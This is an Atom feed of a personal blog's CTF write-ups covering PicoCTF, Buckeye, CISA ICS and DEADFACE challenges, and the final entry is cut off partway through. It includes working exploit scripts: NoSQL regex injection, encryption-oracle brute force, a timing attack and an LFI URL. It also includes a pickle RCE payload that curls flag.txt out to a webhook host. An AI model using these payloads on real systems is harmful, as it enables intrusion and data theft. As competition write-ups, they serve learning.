@@ -1,0 +1,500 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+	<title>Cramik</title>
+	<subtitle></subtitle>
+	
+	<link href="https://cramik.de/feed/feed.xml" rel="self"/>
+	<link href="https://cramik.de"/>
+	<updated>2024-10-18T00:00:00+00:00</updated>
+	<id>https://cramik.de</id>
+	<author>
+		<name>Cramik</name>
+		<email></email>
+	</author>
+	
+	<entry>
+		<title>PicoCTF 2022 Wizardlike &quot;Unique Solution&quot;</title>
+		<link href="https://cramik.de/posts/picoctf-2022-wizardlike-unique/"/>
+		<updated>2023-01-16T00:00:00+00:00</updated>
+		<id>https://cramik.de/posts/picoctf-2022-wizardlike-unique/</id>
+		<content type="html">
+		  &lt;p&gt;An arguably lazy solution to Wizardlike&lt;/p&gt;
+&lt;p&gt;Requirements:&lt;br&gt;
+Cheat Engine/Lunar Engine&lt;br&gt;
+ceserver for linux&lt;br&gt;
+Some decompiler&lt;/p&gt;
+&lt;p&gt;I&#39;m lazy and cheat in videos games so my first intuition was to find the x and y coord values in lunar engine and set these to complete the challenges. You can do this by searching for an all type unknown value and re-searching for when you expect it to change (when you move) and when you don&#39;t expect it to change (standing still) to find the correct values. Doing this provides us with two 4 byte values at game+132F70 and game+132F74 (x, y).&lt;/p&gt;
+&lt;p&gt;However, after doing this and getting through the first couple of levels it becomes apparent that the ctf writer predicted this and made difficult to navigate levels with hidden objects to prevent this.&lt;/p&gt;
+&lt;p&gt;In order to find the hidden objects, you are expected to reverse the function for revealing hidden blocks. One way to do this is to start out by using Lunar Engine again to search for unknown value, this time being some block&#39;s visibility. I ended up finding a 4 byte value at game+136E4C.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://cramik.de/img/wizardlike-blockvisibility.webp&quot; alt=&quot;Screenshot of Lunar Engine Table&quot;&gt;&lt;/p&gt;
+&lt;p&gt;Furthering this path, we can connect Lunar Engine&#39;s debugger via the &amp;quot;Find out what access this address&amp;quot; feature in order to find the instructions involved in revealing the block, 00402A0E for setting it to visible and 00401E82 for setting it to not visible.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://cramik.de/img/wizardlike-whataccesses.webp&quot; alt=&quot;Screenshot of the What Accesses Table&quot;&gt;&lt;/p&gt;
+&lt;p&gt;From here, you can go to your decompiler in order to find the instruction at 00402A0E and the decompiled code for it. Doing this, we see that there is &amp;quot;else if&amp;quot; logic that checks whether the block is already visible and whether a function returns true. We can assume that this function likely is a check for visibility or choose to further read other parts of the code to discern the logic.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://cramik.de/img/wizardlike-ifelse.webp&quot; alt=&quot;Screenshot of the decompiled if else statement in IDA Pro&quot;&gt;&lt;/p&gt;
+&lt;p&gt;When we view the function, we can spot that there are only two sections where the function returns 0, making the block not visible. The instruction addresses for these two return values are 0000210A and 0000204A. We can go back to Lunar Engine, go to its Memory View, find the instruction using Ctrl+G and game+204A, and double click the instruction to patch it live with the value of 1.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://cramik.de/img/wizardlike-idareturn.webp&quot; alt=&quot;Screenshot of the return calls in IDA Pro&quot;&gt;&lt;br&gt;
+&lt;img src=&quot;https://cramik.de/img/wizardlike-patch-one.webp&quot; alt=&quot;Screenshot of finding the address in Lunar Engine&quot;&gt;&lt;br&gt;
+&lt;img src=&quot;https://cramik.de/img/wizardlike-patch-two.webp&quot; alt=&quot;Screenshot of patched code in Lunar Engine&quot;&gt;&lt;/p&gt;
+&lt;p&gt;Finally, we can check our work by moving around and find the entire map we are on is now visible. This allows us to go between the levels now and view the flag, picoCTF{ur_4_w1z4rd_8F4B04AE} (for an added bonus you can also find the 4 byte map value to avoid having to walk in-between levels)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://cramik.de/img/wizardlike-level8.webp&quot; alt=&quot;Screenshot of level 8&quot;&gt;&lt;br&gt;
+&lt;img src=&quot;https://cramik.de/img/wizardlike-level2.webp&quot; alt=&quot;Screenshot of level 2&quot;&gt;&lt;/p&gt;
+
+			
+		</content>
+	</entry>
+	
+	<entry>
+		<title>CSAW CTF 2023</title>
+		<link href="https://cramik.de/posts/csaw-ctf-2023/"/>
+		<updated>2023-09-15T00:00:00+00:00</updated>
+		<id>https://cramik.de/posts/csaw-ctf-2023/</id>
+		<content type="html">
+		  
+			
+		</content>
+	</entry>
+	
+	<entry>
+		<title>Buckeye CTF 2023</title>
+		<link href="https://cramik.de/posts/buckeye-ctf-2023/"/>
+		<updated>2023-10-02T00:00:00+00:00</updated>
+		<id>https://cramik.de/posts/buckeye-ctf-2023/</id>
+		<content type="html">
+		  &lt;h2 id=&quot;stray&quot;&gt;Stray &lt;a class=&quot;direct-link&quot; href=&quot;#stray&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;I wrote down this was a javascript type pollution LFI&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://stray.chall.pwnoh.io/cat?category%5B%5D=../flag.txt&quot;&gt;https://stray.chall.pwnoh.io/cat?category[]=../flag.txt&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;bctf{j4v45cr1p7_15_4_6r347_l4n6u463}&lt;/p&gt;
+&lt;h2 id=&quot;electronical&quot;&gt;Electronical &lt;a class=&quot;direct-link&quot; href=&quot;#electronical&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;I did this one in three parts since my script was broken but still solved it. Even the official solution for this one said &amp;quot;solve script doesn&#39;t entirely work but mostly&amp;quot;&lt;/p&gt;
+&lt;h3 id=&quot;script1&quot;&gt;Script1 &lt;a class=&quot;direct-link&quot; href=&quot;#script1&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;import string
+import requests
+
+zeros=11
+payload=&amp;quot;bctf&amp;quot;
+while zeros!=0:
+    goal=requests.get(&amp;quot;https://electronical.chall.pwnoh.io/encrypt?message=&amp;quot;+&#39;0&#39;*zeros).text[:32]
+    print(&amp;quot;Goal = &amp;quot;, goal)
+    for char in string.printable:
+        print(&#39;0&#39;*zeros+payload+char)
+        check=requests.get(&amp;quot;https://electronical.chall.pwnoh.io/encrypt?message=&amp;quot;+&#39;0&#39;*zeros+payload+char).text[:32]
+        print(&amp;quot;Check = &amp;quot;, check)
+        if (check==goal):
+            print(&amp;quot;Correct&amp;quot;)
+            payload+=char
+            zeros-=1
+            break
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;script2&quot;&gt;Script2 &lt;a class=&quot;direct-link&quot; href=&quot;#script2&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;import string
+import requests
+
+zeros=16
+payload=&amp;quot;bctf{1_c4n7_b3l&amp;quot;
+while zeros!=0:
+    goal=requests.get(&amp;quot;https://electronical.chall.pwnoh.io/encrypt?message=&amp;quot;+&#39;0&#39;*zeros).text[32:64]
+    print(&amp;quot;Goal = &amp;quot;, goal)
+    for char in string.printable:
+        print(&#39;0&#39;*zeros+payload+char)
+        check=requests.get(&amp;quot;https://electronical.chall.pwnoh.io/encrypt?message=&amp;quot;+&#39;0&#39;*zeros+payload+char).text[32:64]
+        print(&amp;quot;Check = &amp;quot;, check)
+        if (check==goal):
+            print(&amp;quot;Correct&amp;quot;)
+            payload+=char
+            break
+    zeros-=1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;script3&quot;&gt;Script3 &lt;a class=&quot;direct-link&quot; href=&quot;#script3&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;import string
+import requests
+
+zeros=16
+payload=&amp;quot;bctf{1_c4n7_b3l13v3_u_f0und_my_&amp;quot;
+while zeros!=0:
+    goal=requests.get(&amp;quot;https://electronical.chall.pwnoh.io/encrypt?message=&amp;quot;+&#39;0&#39;*zeros).text[64:96]
+    print(&amp;quot;Goal = &amp;quot;, goal)
+    for char in string.printable:
+        print(&#39;0&#39;*zeros+payload+char)
+        check=requests.get(&amp;quot;https://electronical.chall.pwnoh.io/encrypt?message=&amp;quot;+&#39;0&#39;*zeros+payload+char).text[64:96]
+        print(&amp;quot;Check = &amp;quot;, check)
+        if (check==goal):
+            print(&amp;quot;Correct&amp;quot;)
+            payload+=char
+            break
+    zeros-=1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;area51&quot;&gt;Area51 &lt;a class=&quot;direct-link&quot; href=&quot;#area51&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Abusing NoSQL injection. See &lt;a href=&quot;https://portswigger.net/web-security/nosql-injection&quot;&gt;https://portswigger.net/web-security/nosql-injection&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+import string
+
+success=len(requests.get(&amp;quot;https://area51.chall.pwnoh.io/&amp;quot;,cookies={&amp;quot;session&amp;quot;:&amp;quot;{&#92;&amp;quot;token&#92;&amp;quot;:{&#92;&amp;quot;$regex&#92;&amp;quot;:&#92;&amp;quot;&amp;quot;+password+&amp;quot;.*&#92;&amp;quot;}}&amp;quot;}).content)
+keyspace=string.ascii_letters+string.digits+&amp;quot;_&amp;quot;+&amp;quot;{&amp;quot;+&amp;quot;}&amp;quot;
+password=&amp;quot;bctf&amp;quot;
+while(password[-1]!=&#39;}&#39;):
+     for char in keyspace:
+             print(password+char)
+             if(len(requests.get(&amp;quot;https://area51.chall.pwnoh.io/&amp;quot;,cookies={&amp;quot;session&amp;quot;:&amp;quot;{&#92;&amp;quot;token&#92;&amp;quot;:{&#92;&amp;quot;$regex&#92;&amp;quot;:&#92;&amp;quot;&amp;quot;+password+char+&amp;quot;.*&#92;&amp;quot;}}&amp;quot;}).content)==success): 
+                 password+=char
+                 break
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;text-adventure-api&quot;&gt;Text Adventure API &lt;a class=&quot;direct-link&quot; href=&quot;#text-adventure-api&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Only slightly different from official solution. Save pickle is loaded on the server allowing RCE via python reduce&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;class test:
+  def __reduce__(self):
+             import subprocess
+             return subprocess.check_output, ([&amp;quot;curl&amp;quot;,&amp;quot;-d&amp;quot;,&amp;quot;@flag.txt&amp;quot;,&amp;quot;https://webhook.site/d5092a4a-c837-495e-b231-1511bcdaddae&amp;quot;],)
+pickle.dump(test(),open(&#39;C:/Users/Cramik/Desktop/payload5.pkl&#39;,&#39;wb&#39;))
+&lt;/code&gt;&lt;/pre&gt;
+
+			
+		</content>
+	</entry>
+	
+	<entry>
+		<title>CISA ICS CTF 2024</title>
+		<link href="https://cramik.de/posts/cisa-ics-2024/"/>
+		<updated>2024-09-01T00:00:00+00:00</updated>
+		<id>https://cramik.de/posts/cisa-ics-2024/</id>
+		<content type="html">
+		  &lt;h2 id=&quot;extend-your-stay---1&quot;&gt;Extend Your Stay - 1 &lt;a class=&quot;direct-link&quot; href=&quot;#extend-your-stay---1&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;crx files are chrome extensions that are basically just zip files. We can open it up, go to background.js and we&#39;ll see some code at the bottom:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;// This will execute when the extension is first installed
+chrome.runtime.onInstalled.addListener(() =&amp;gt; {
+    var val = &amp;quot;ZmxhZ3toeXAzcjN4dDNuZDNkfQ==&amp;quot;;
+    console.log(&amp;quot;NO MORE RODENTS!!!!!!!!!!&amp;quot;);
+    console.log(atob(val));
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;val is a base64 encoded string that decodes to &amp;quot;flag{hyp3r3xt3nd3d}&amp;quot;&lt;/p&gt;
+&lt;h2 id=&quot;extend-your-stay---2&quot;&gt;Extend Your Stay - 2 &lt;a class=&quot;direct-link&quot; href=&quot;#extend-your-stay---2&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;This part is included in the obfuscated part since it is malicious, we dont actually have to deobfuscate we can just start base64 decoding random base64 strings until we find  aHR0cHM6Ly93d3cuZmVsbHN3YXJnby5jb20v == &lt;a href=&quot;https://www.fellswargo.com/&quot;&gt;https://www.fellswargo.com/&lt;/a&gt; which matches the challenge prompt&lt;/p&gt;
+&lt;h2 id=&quot;mission%3A-inconceivable---1&quot;&gt;Mission: Inconceivable - 1 &lt;a class=&quot;direct-link&quot; href=&quot;#mission%3A-inconceivable---1&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://postalpro.usps.com/ppro-tools/encoder-decoder&quot;&gt;https://postalpro.usps.com/ppro-tools/encoder-decoder&lt;/a&gt;&lt;br&gt;
+DAFFFDDFTTFATDTDFFDTDAFADAATFATDTADTAFFDDTDTTADFDTTFDDAFAFFAFTATT&lt;br&gt;
+Chicago&lt;/p&gt;
+&lt;h2 id=&quot;mission%3A-inconceivable---2&quot;&gt;Mission: Inconceivable - 2 &lt;a class=&quot;direct-link&quot; href=&quot;#mission%3A-inconceivable---2&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;&amp;quot;Using the information you know about the attackers, especially their culinary tastes, can you identify the BSSID (the access point&#39;s MAC address) for their hideout&#39;s WiFi network?&amp;quot;&lt;br&gt;
+8A:9C:67:46:08:B1&lt;br&gt;
+41.67711639,-107.9834137,Bringmetacosplease,0,20230701-00000,2023-07-01T14:00:00.000Z,2023-08-26T05:00:00.000Z,2023-08-26T05:00:00.000Z,8A:9C:67:46:08:B1,,infra,,2,0,?,?,?,False,11,,wpa2,US,WY,Carlton Road,,,&lt;/p&gt;
+&lt;h2 id=&quot;read-askew-manuscripts---1&quot;&gt;Read Askew Manuscripts - 1 &lt;a class=&quot;direct-link&quot; href=&quot;#read-askew-manuscripts---1&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;volatility.exe printkey -f memdump_fewer_images_test1.raw -K Software&#92;ACME_XRay&lt;br&gt;
+ZmxhZ3tmMzNsMW5nX3YwbEB0MWwzfQ==&lt;br&gt;
+flag{f33l1ng_v0l@t1l3}&lt;/p&gt;
+&lt;h2 id=&quot;read-askew-manuscripts---2&quot;&gt;Read Askew Manuscripts - 2 &lt;a class=&quot;direct-link&quot; href=&quot;#read-askew-manuscripts---2&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;C:&#92;Users&#92;Cramik&#92;Downloads&#92;memdump.raw&amp;gt;volatility.exe notepad -f memdump_fewer_images_test1.raw&lt;br&gt;
+Volatility Foundation Volatility Framework 2.6&lt;br&gt;
+Process: 172&lt;br&gt;
+Text:&lt;br&gt;
+Dear friend,&lt;/p&gt;
+&lt;p&gt;Thank you for supporting this mission. Well, not like you really had a choice :)&lt;/p&gt;
+&lt;p&gt;Upload the patient&#39;s image using the link below. Do not upload any other patients. And do not get the wrong patient. I am out of patience.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.ev1lf1lestorage.info/?directory=images&amp;amp;user=ominousnoteperson&amp;amp;passB64=aWxpa2V3cml0aW5nb21pbm91c25vdGVz&amp;amp;login=true&quot;&gt;https://www.ev1lf1lestorage.info/?directory=images&amp;amp;user=ominousnoteperson&amp;amp;passB64=aWxpa2V3cml0aW5nb21pbm91c25vdGVz&amp;amp;login=true&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;If necessary, you can use this flash drive to extract the image, but ONLY if the cloud storage doesn&#39;t work. And I know it works so don&#39;t pull any funny business.&lt;/p&gt;
+&lt;p&gt;Drop this flash drive at ///trips.pistons.huffs when you&#39;re done. If you see a man with an accordion, run.&lt;/p&gt;
+&lt;p&gt;See you never,&lt;/p&gt;
+&lt;p&gt;The Ominous Note Writer&lt;/p&gt;
+&lt;p&gt;P.S. If you get hungry on this mission, you&#39;re on your own. Bring a snack and just Eat It.&lt;/p&gt;
+&lt;p&gt;ilikewritingominousnotes&lt;/p&gt;
+&lt;h2 id=&quot;read-askew-manuscripts---3&quot;&gt;Read Askew Manuscripts - 3 &lt;a class=&quot;direct-link&quot; href=&quot;#read-askew-manuscripts---3&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;C:&#92;Users&#92;Cramik&#92;Downloads&#92;memdump.raw&amp;gt;volatility.exe iehistory -f memdump_fewer_images_test1.raw&lt;br&gt;
+Volatility Foundation Volatility Framework 2.6&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Process: 1588 explorer.exe&lt;br&gt;
+Cache type &amp;quot;DEST&amp;quot; at 0x21b1e2d&lt;br&gt;
+Last modified: 2024-04-11 11:42:52 UTC+0000&lt;br&gt;
+Last accessed: 2024-04-11 17:42:54 UTC+0000&lt;br&gt;
+URL: Administrator@file:///E:/Phoenix_Wright.png&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Process: 1588 explorer.exe&lt;br&gt;
+Cache type &amp;quot;DEST&amp;quot; at 0x21cea1d&lt;br&gt;
+Last modified: 2024-04-11 11:42:52 UTC+0000&lt;br&gt;
+Last accessed: 2024-04-11 17:42:54 UTC+0000&lt;br&gt;
+URL: Administrator@file:///E:/Phoenix_Wright.png&lt;/p&gt;
+&lt;h2 id=&quot;read-askew-manuscripts---4&quot;&gt;Read Askew Manuscripts - 4 &lt;a class=&quot;direct-link&quot; href=&quot;#read-askew-manuscripts---4&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://steemit.com/security/@nybble/forensic-extracting-files-from-mft-table-with-volatility-part-2-en&quot;&gt;https://steemit.com/security/@nybble/forensic-extracting-files-from-mft-table-with-volatility-part-2-en&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;C:&#92;Users&#92;Cramik&#92;Downloads&#92;memdump.raw&amp;gt;volatility.exe filescan -f memdump_fewer_images_test1.raw | grep Phoenix&lt;br&gt;
+Volatility Foundation Volatility Framework 2.6&lt;br&gt;
+0x00000000096959b0      1      0 RW-rw- &#92;Device&#92;HarddiskVolume1&#92;Documents and Settings&#92;Administrator&#92;Recent&#92;Phoenix_Wright.lnk&lt;br&gt;
+0x0000000009769228      1      0 R--r-- &#92;Device&#92;DP(1)0-0+3&#92;Phoenix_Wright.png&lt;br&gt;
+0x000000000978c820      1      0 R--r-- &#92;Device&#92;HarddiskVolume1&#92;Documents and Settings&#92;Administrator&#92;Desktop&#92;patient_images&#92;Phoenix_Wright.png&lt;/p&gt;
+&lt;p&gt;C:&#92;Users&#92;Cramik&#92;Downloads&#92;memdump.raw&amp;gt;volatility.exe dumpfiles -Q 0x0000000009769228 -D files/ -u -n -f memdump_fewer_images_test1.raw&lt;br&gt;
+Volatility Foundation Volatility Framework 2.6&lt;br&gt;
+DataSectionObject 0x09769228   None   &#92;Device&#92;DP(1)0-0+3&#92;Phoenix_Wright.png&lt;/p&gt;
+&lt;h2 id=&quot;follow-the-charts---3&quot;&gt;Follow the Charts - 3 &lt;a class=&quot;direct-link&quot; href=&quot;#follow-the-charts---3&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;The malicious application is a notes to bash converter. The main function for decoding is &amp;quot;decodechart.&amp;quot; Reversing is an option, but would be hard considering the amount of xors, bitwise operations, and subfuctions. Instead, we can use a sandbox like app.any.run just to see what commands it runs and we&#39;ll see &amp;quot;sh -c &amp;quot;#flag{W31C0Me_t0_tH3_JUn6L3} echo &amp;quot;Finished updating clone hero charts :)&amp;quot;&amp;quot;&amp;quot;&lt;/p&gt;
+&lt;h2 id=&quot;introduction-to-malcolm---8&quot;&gt;Introduction to Malcolm - 8 &lt;a class=&quot;direct-link&quot; href=&quot;#introduction-to-malcolm---8&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;destination.port&amp;gt;60000 AND source.port&amp;gt;60000&lt;br&gt;
+include the network.community_id field on the left side&lt;/p&gt;
+&lt;h2 id=&quot;introduction-to-malcolm---9&quot;&gt;Introduction to Malcolm - 9 &lt;a class=&quot;direct-link&quot; href=&quot;#introduction-to-malcolm---9&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;communityId==&amp;quot;1:lkHwtdagxh1Nv9QKO2SuVdVkQ0I=&amp;quot;&lt;/p&gt;
+&lt;h2 id=&quot;learning-to-drift---1&quot;&gt;Learning to DRIFT - 1 &lt;a class=&quot;direct-link&quot; href=&quot;#learning-to-drift---1&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;packet 6 PLC -&amp;gt; HMI NEW-CONNECTION-RESPONSE&lt;br&gt;
+000c = length&lt;br&gt;
+01 = message code (NEW-CONNECTION)&lt;br&gt;
+00 = respone code&lt;br&gt;
+61cb506b8ff1b477 = Partial AES&lt;/p&gt;
+&lt;p&gt;The first encrypted command sent by the HMI in this capture is a Read-Sensor command. What was the responded current-value of that sensor (sensor id is 100)?&lt;/p&gt;
+&lt;p&gt;packet 8 HMI -&amp;gt; PLC READ-SENSOR-REQUEST&lt;br&gt;
+001a = length&lt;br&gt;
+a9de4b26a71f6989 = partial aes key&lt;br&gt;
+6d21595f8c02ffad25b55ed49a4a3d8e&lt;/p&gt;
+&lt;p&gt;Create a cyberchef recipe:&lt;br&gt;
+AES_Decrypt({&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;61cb506b8ff1b477a9de4b26a71f6989&#39;},{&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;&#39;},&#39;ECB&#39;,&#39;Hex&#39;,&#39;Raw&#39;,{&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;&#39;},{&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;&#39;})&lt;br&gt;
+To_Hex(&#39;Space&#39;,0)&lt;/p&gt;
+&lt;p&gt;Decrypt 6d21595f8c02ffad25b55ed49a4a3d8e&lt;/p&gt;
+&lt;p&gt;Output:&lt;br&gt;
+03 - Message code (READ-SENSOR)&lt;br&gt;
+64 - Sensor ID&lt;/p&gt;
+&lt;p&gt;Packet 9 PLC -&amp;gt; HMI READ-SENSOR-RESPONSE&lt;br&gt;
+001a = length&lt;br&gt;
+9191c45d7fe2ddca = partial aes key&lt;br&gt;
+39f35ca00eb0ada6c29996f1bf9eb2e7&lt;/p&gt;
+&lt;p&gt;AES_Decrypt({&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;61cb506b8ff1b4779191c45d7fe2ddca&#39;},{&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;&#39;},&#39;ECB&#39;,&#39;Hex&#39;,&#39;Raw&#39;,{&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;&#39;},{&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;&#39;})&lt;br&gt;
+To_Hex(&#39;Space&#39;,0)&lt;br&gt;
+Decrypt 39f35ca00eb0ada6c29996f1bf9eb2e7&lt;/p&gt;
+&lt;p&gt;Output:&lt;br&gt;
+03 = message code&lt;br&gt;
+00 = response code&lt;br&gt;
+64 = sensor id&lt;br&gt;
+00 00 02 06 = value&lt;br&gt;
+0206 hex to decimal is 518&lt;/p&gt;
+&lt;p&gt;Bulk Recipe:&lt;br&gt;
+Drop_bytes(0,4,false)&lt;br&gt;
+Register(&#39;(^.{16})&#39;,true,false,false)&lt;br&gt;
+Drop_bytes(0,16,false)&lt;br&gt;
+AES_Decrypt({&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;9bc665880b5df8fc$R0&#39;},{&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;&#39;},&#39;ECB&#39;,&#39;Hex&#39;,&#39;Raw&#39;,{&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;&#39;},{&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;&#39;})&lt;br&gt;
+To_Hex(&#39;Space&#39;,0)&lt;/p&gt;
+&lt;p&gt;Sensor request: 001a0a6f538822259c7390a6e5d86712724891d7549593f8ff95&lt;br&gt;
+06 = message code&lt;br&gt;
+06 = count&lt;br&gt;
+64 65 66 67 68 69 = sensor ids&lt;/p&gt;
+&lt;p&gt;Sensor Response:&lt;br&gt;
+06 = message code&lt;br&gt;
+00 = response code&lt;br&gt;
+06 = sensor count&lt;br&gt;
+Sensor ranges:&lt;br&gt;
+64 00 00 01 e0 00 00 02 3a 00 00 01 c2 00 00 02 58 65 00 00 01 9a 00 00 01 ea 00 00 01 90 00 00 01 f4 66 00 00 00 41 00 00 00 4b 00 00 00 3c 00 00 00 50 67 00 00 00 41 00 00 00 4b 00 00 00 3c 00 00 00 50 68 00 00 00 41 00 00 00 4b 00 00 00 3c 00 00 00 50 69 00 00 00 41 00 00 00 4b 00 00 00 3c 00 00 00 50&lt;/p&gt;
+&lt;p&gt;Each sensor range is 17 bytes:&lt;br&gt;
+64000001e00000023a000001c200000258&lt;br&gt;
+650000019a000001ea00000190000001f4&lt;br&gt;
+66000000410000004b0000003c00000050&lt;br&gt;
+67000000410000004b0000003c00000050&lt;br&gt;
+68000000410000004b0000003c00000050&lt;br&gt;
+69000000410000004b0000003c00000050&lt;/p&gt;
+&lt;p&gt;Break up each sensor range to ID and ranges&lt;br&gt;
+64 = Sensor ID&lt;br&gt;
+000001e0 = WARNING-LOW&lt;br&gt;
+0000023a = WARNING-HIGH&lt;br&gt;
+000001c2 = ALERT-LOW&lt;br&gt;
+00000258 = ALERT-HIGH&lt;/p&gt;
+&lt;p&gt;Alarms (3rd TCP session):&lt;br&gt;
+001a8ddec2027f0172a440e2a3c789beff16e77009c9c5213c1f - GET-ALARM-REQUEST (0x07)&lt;/p&gt;
+&lt;p&gt;001a64314cb84d00addee6843f0381d1db25da6b2506dd76f524 - GET-ALARMS-RESPONSE&lt;/p&gt;
+&lt;p&gt;Decrypts to:&lt;br&gt;
+07 - Message code&lt;br&gt;
+00 - Response code&lt;br&gt;
+02 - Alarm Count&lt;br&gt;
+Alarm Data:&lt;br&gt;
+66 - Sensor ID&lt;br&gt;
+a0 - Alarm Code (WARNING: LOW)&lt;br&gt;
+0000003f - Value = 63&lt;/p&gt;
+&lt;p&gt;6b - Sensor ID&lt;br&gt;
+b1 - Alarm Code (ALERT: HIGH)&lt;br&gt;
+0000041a - Value = 1050&lt;/p&gt;
+&lt;h2 id=&quot;a-timely-attack&quot;&gt;A Timely Attack &lt;a class=&quot;direct-link&quot; href=&quot;#a-timely-attack&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;import subprocess
+import string
+import time
+
+# Base string to start with
+test_string = [&amp;quot;0&amp;quot;]*8
+best_char = &#39;&#39;
+keyspace = string.digits+string.ascii_lowercase
+
+for i in range(len(test_string)):
+	max_time = -1
+	second_best = -1
+	best_char = &#39;&#39;
+	
+	for char in keyspace:
+		test_string[i]=char
+		
+		start_time = time.time()
+
+		for _ in range(1): subprocess.run([&amp;quot;./time_attack1&amp;quot;, &#39;&#39;.join(test_string)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+		elapsed_time = time.time() - start_time
+		print(f&amp;quot;{char} - {elapsed_time}&amp;quot;)
+		if elapsed_time &amp;gt; max_time:
+			second_best = max_time
+			max_time = elapsed_time
+			best_char = char
+	test_string[i]=best_char
+	print(f&amp;quot;Found {best_char} {(max_time/second_best-1)} Current best string: {&#39;&#39;.join(test_string)}, elapsed time: {max_time}&amp;quot;)
+
+# Final string after all iterations
+print(f&amp;quot;Final string: {test_string}&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;flag{1t_0Nly_T@k3s_4_l3ttlE_T!mE}&lt;/p&gt;
+
+			
+		</content>
+	</entry>
+	
+	<entry>
+		<title>DEADFACE CTF 2024</title>
+		<link href="https://cramik.de/posts/deadface-ctf-2024/"/>
+		<updated>2024-10-18T00:00:00+00:00</updated>
+		<id>https://cramik.de/posts/deadface-ctf-2024/</id>
+		<content type="html">
+		  &lt;p&gt;It took me like 15 minutes to figure out what CTF these notes were for because I never labelled them and half of these challenges don&#39;t show up when you google them.&lt;/p&gt;
+&lt;h2 id=&quot;something-in-the-dark&quot;&gt;Something in the Dark &lt;a class=&quot;direct-link&quot; href=&quot;#something-in-the-dark&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Category: Steg&lt;br&gt;
+The challenge links an image of a tweet talking about flashing &amp;quot;RED GREEN BLUE&amp;quot; and another image. First instinct is using a tool like stegsolver to view the various planes (alpha, red, green, blue) both visually and as data. Going through each plan visually we can spot text on Red Plane 1 saying &amp;quot;flag{ar3_we_410N3??}&amp;quot;&lt;/p&gt;
+&lt;h2 id=&quot;price-check&quot;&gt;Price Check &lt;a class=&quot;direct-link&quot; href=&quot;#price-check&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Category: Steg&lt;br&gt;
+The challenge gives us a csv with a hint to &amp;quot;scan.&amp;quot; Looking at the csv it is a 29x29 matrix of numbers from 0-255 (denoting a byte, and potentially a color if you get what I&#39;m going with). These two things sound a lot like 29x29 node QR code. I don&#39;t believe there is any software to translate this file format and I don&#39;t have pillow memorized, so I decided to have chatgpt do it&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;See the following:
+# CSV to Image Conversion
+
+#### You:
+I have a csv file denoting a 29x29 black and white image ie 255,255,0,255&#92;n0,255... can you write a python script to convert it to an image
+
+#### ChatGPT:
